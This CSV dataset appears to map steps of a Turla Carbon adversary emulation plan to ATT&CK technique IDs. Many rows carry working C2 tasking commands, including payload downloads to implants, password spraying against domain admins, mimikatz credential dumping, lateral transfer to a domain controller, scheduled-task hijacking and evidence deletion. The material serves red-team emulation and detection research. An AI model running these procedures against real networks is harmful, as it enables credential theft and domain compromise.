org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
turla_carbon,turla_carbon,unknown,turla_carbon::11,11,Download the CARBON-DLL installer (Adversary),"id: da986326-8d71-4e85-b767-0c8ffc49a2af | name: Download the CARBON-DLL installer (Adversary) | description: Task the SYSTEM level EPIC implant to download the CARBON-DLL installer.
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_command_and_control | procedure_step: 4.A.1 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.epic.id} 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.epic.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::12,12,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::13,13,Execute the CARBON-DLL installer (Adversary),"id: d702d810-3414-4e38-8cbc-22fc429d2da4 | name: Execute the CARBON-DLL installer (Adversary) | description: Task the SYSTEM level EPIC implant to execute the CARBON-DLL installer.
 | tactic: Defense Evasion | technique: attack_id: T1112 | name: Modify Registry | procedure_group: procedure_defense_evasion | procedure_step: 4.A.2-4.A.6 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.epic.id} 'exe | C:\Windows\System32\WinResSvc.exe' --task-wait-timeout 60; 
sleep 180;
 | timeout: 300 | requirements: plugins.emu.app.requirements.check_registered: source: second.epic.id","[""T1112""]","[""T1112""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::14,14,Modify Registry,attack_id: T1112 | name: Modify Registry,"[""T1112""]","[""T1112""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::15,15,Perform whoami discovery command (Adversary),"id: f2462df4-2867-4d72-b3f1-ffa9a7431f87 | name: Perform whoami discovery command (Adversary) | description: Task the Carbon implant to execute the whoami discovery command.
 | tactic: Discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | procedure_group: procedure_discovery | procedure_step: 4.A.13 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 0, ""cmd"": ""whoami""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::16,16,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::17,17,Password Spray (Adversary),"id: 99748bd2-530e-47b6-b6d7-576d4f573b6d | name: Password Spray (Adversary) | description: Task CARBON-DLL to download and execute the batch script to spray weak passwords against the domain admin accounts and attempt to mount the C$ drive of the DC.
 | tactic: Credential Access | technique: attack_id: T1110.003 | name: Brute Force: Password Spraying | procedure_group: procedure_credential_access | procedure_step: 5.A.2-3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id}  '{""id"": 1, ""payload"": ""password_spray.bat"", ""payload_dest"": ""C:\\Windows\\Temp\\winsas64.bat"", ""cmd"": ""C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeout 300 | grep 'SUCCESS'
 | timeout: 300 | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1110.003""]","[""T1110""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::18,18,Brute Force: Password Spraying,attack_id: T1110.003 | name: Brute Force: Password Spraying,"[""T1110.003""]","[""T1110""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::19,19,Remove password spray script (Adversary),"id: 4945a1e5-75ab-4665-8441-6995105edf38 | name: Remove password spray script (Adversary) | description: Task CARBON-DLL to remove the password spray script  
 | tactic: Defense Evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | procedure_group: procedure_defense_evasion | procedure_step: 5.A.4 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id}  '{""id"": 2, ""cmd"": ""del /Q C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::20,20,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::21,21,Download second CARBON-DLL (Adversary),"id: 386b614d-7237-4d1a-a6dd-543f6f515bd4 | name: Download second CARBON-DLL (Adversary) | description: Task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the System32 folder on the DC via the mounted drive.
 | tactic: Lateral Movement | technique: attack_id: T1570 | name: Lateral Tool Transfer | procedure_group: None | procedure_step: 5.A.5-6 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 3, ""payload"": ""carbon_installer_2.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\wmimetricsq.exe"", ""cmd"": ""move C:\\Windows\\Temp\\wmimetricsq.exe \\\\#{second.target.host}\\C$\\Windows\\System32""}' --task-wait-timeout 60
 | input_arguments: second.target.host: description: The hostname of the second target host. | type: string | default: bannik | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::22,22,Lateral Tool Transfer,attack_id: T1570 | name: Lateral Tool Transfer,"[""T1570""]","[""T1570""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::23,23,Enumerate remote scheduled tasks (Adversary),"id: 954ee411-8443-41f9-9a0c-f8ac032b68e7 | name: Enumerate remote scheduled tasks (Adversary) | description: Task CARBON-DLL to enumerate remote scheduled tasks on the domain controller, using the discovered password for the domain admin  
 | tactic: Execution | technique: attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task | procedure_group: procedure_execution | procedure_step: 5.A.7 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 4, ""cmd"": ""schtasks /query /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password}""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::24,24,Scheduled Task/Job: Scheduled Task,attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task,"[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::25,25,Modify remote scheduled task (Adversary),"id: c90bbb6c-f9bd-4811-b7b7-c923902a8bde | name: Modify remote scheduled task (Adversary) | description: Task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain admin
 | tactic: Persistence | technique: attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task | procedure_group: procedure_persistence | procedure_step: 5.A.7 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 5, ""cmd"": ""schtasks /Change /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \""\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"" /TR %SystemRoot%\\System32\\wmimetricsq.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::26,26,Scheduled Task/Job: Scheduled Task,attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task,"[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::27,27,Execute modified scheduled task (Adversary),"id: a2621060-73a5-461b-918d-88a86f83c21b | name: Execute modified scheduled task (Adversary) | description: Task CARBON-DLL to remotely start the modified scheduled task on the domain controller
 | tactic: Privilege Escalation | technique: attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task | procedure_group: procedure_privilege_escalation | procedure_step: 5.A.7 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 6, ""cmd"": ""schtasks /Run /S #{second.target.host} /U #{network.domain.name}\\#{second.target.user} /P #{second.target.password} /TN \""\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"" /I""}' --task-wait-timeout 300; 
sleep 180;
 | timeout: 300 | requirements: plugins.emu.app.requirements.check_registered: source: first.carbon.id","[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::28,28,Scheduled Task/Job: Scheduled Task,attack_id: T1053.005 | name: Scheduled Task/Job: Scheduled Task,"[""T1053.005""]","[""T1053""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::29,29,Discovery on domain controller (Adversary),"id: bf90a64c-5367-4de6-93b5-a718189803c3 | name: Discovery on domain controller (Adversary) | description: Task the new CARBON-DLL implant with discovery commands to be run on the domain controller.  
 | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 5.A.9 | platforms: linux: sh: command: output=$(./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 0, ""cmd"": ""net group /domain""}' --task-wait-timeout 60);
echo $output | grep 'Web Servers' -i && echo $output | grep 'Web Server Admins' -i;
 | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::30,30,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::31,31,Enumerate groups (Adversary),"id: 4e39b630-f2d7-405e-a4ef-d11cf79db1be | name: Enumerate groups (Adversary) | description: Task CARBON-DLL to enumerate both groups for their members
 | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 5.A.9 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 1, ""cmd"": ""net group \""Web Servers\"" /domain && net group \""Web Server Admins\"" /domain""}' --task-wait-timeout 60;
 | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::32,32,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::33,33,Enumerate Active Directory Computers (Adversary),"id: 4e31798e-f973-4480-aa38-3372c44c29c9 | name: Enumerate Active Directory Computers (Adversary) | description: Task CARBON-DLL to enumerate the Active Directory Computers
 | tactic: Discovery | technique: attack_id: T1018 | name: Remote System Discovery | procedure_group: procedure_discovery | procedure_step: 5.A.10 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 2, ""cmd"": ""dsquery * -filter \""(&(objectclass=computer))\"" -attr *""}' --task-wait-timeout 60 | grep -i '#{third.target.user} Workstation'
 | input_arguments: third.target.user: description: The username of the third target host. | type: string | default: adalwolfa | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::34,34,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::35,35,Mimikatz lsadump (Adversary),"id: 33d4136a-d5e6-45f2-b0e1-786d3ec8bf02 | name: Mimikatz lsadump (Adversary) | description: Task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump
 | tactic: Credential Access | technique: attack_id: T1003 | name: OS Credential Dumping | procedure_group: procedure_credential_access | procedure_step: 6.A.1-3 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 3, ""payload"": ""DvKGMmGn.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\terabox.exe"", ""cmd"": ""move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\\terabox.exe && C:\\Windows\\System32\\terabox.exe \""lsdu::go /ynot\"" \""quit\""""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::36,36,OS Credential Dumping,attack_id: T1003 | name: OS Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::37,37,Download PsExec (Adversary),"id: f9ad6b77-518e-4784-9fba-5e4cd97fc455 | name: Download PsExec (Adversary) | description: Task the CARBON-DLL implant on the domain controller to download PsExec.
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress tool transfer | procedure_group: procedure_command_and_control | procedure_step: 7.A.1 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 4, ""payload"": ""PsExec.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp5712.tmp"", ""cmd"": ""move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe && dir C:\\Windows\\System32\\wsqsp.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::38,38,Ingress tool transfer,attack_id: T1105 | name: Ingress tool transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
turla_carbon,turla_carbon,unknown,turla_carbon::39,39,Download third CARBON-DLL (Adversary),"id: 75424a6a-28f5-46fa-834b-508f7d09020a | name: Download third CARBON-DLL (Adversary) | description: Task the CARBON-DLL implant on the domain controller to download a third copy of the CARBON-DLL installer.
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress tool transfer | procedure_group: procedure_command_and_control | procedure_step: 7.A.2 | platforms: linux: sh: command: ./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 5, ""payload"": ""carbon_installer_3.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\tmp1283.tmp"", ""cmd"": ""move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe && dir C:\\Windows\\System32\\wsqmanager.exe""}' --task-wait-timeout 60
 | requirements: plugins.emu.app.requirements.check_registered: source: second.carbon.id","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\turla\Emulation_Plan\yaml\turla_carbon.yaml,yaml_regex_extract,high
